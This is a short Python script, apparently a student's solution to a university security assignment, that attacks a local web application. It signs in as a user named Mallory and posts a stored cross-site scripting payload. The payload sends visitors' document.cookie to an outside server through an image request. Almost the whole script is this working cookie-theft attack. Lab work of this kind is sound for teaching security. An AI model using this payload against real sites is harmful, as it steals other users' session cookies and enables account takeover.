import os, requests, urllib

PROTOCOL = "http"
HOST = "localhost"
PORT = "8080"
BASE = PROTOCOL + "://" + HOST + ":" + PORT

# Mallory's credentials
mallory = {
    'email': 'mallory@example.com',
    'password': 'pass4mallory'
}

# reset the application
requests.get(BASE + '/reset.php')

# #######  your attack goes here  #######
# start a session
with requests.Session() as s:
     # sign-in as mallory (POST request)
     res = s.post(BASE + '/signin.php', data=mallory)

     # post a message (GET request)
     msg = {'msg': '<script>image = new Image(); image.src="https://mathlab.utsc.utoronto.ca/courses/cscd27f16/assignment/03/server/token.php?utorid=chenmi12&"+document.cookie;</script>'}
     s.get(BASE + '/post.php', params=msg)


# #########################################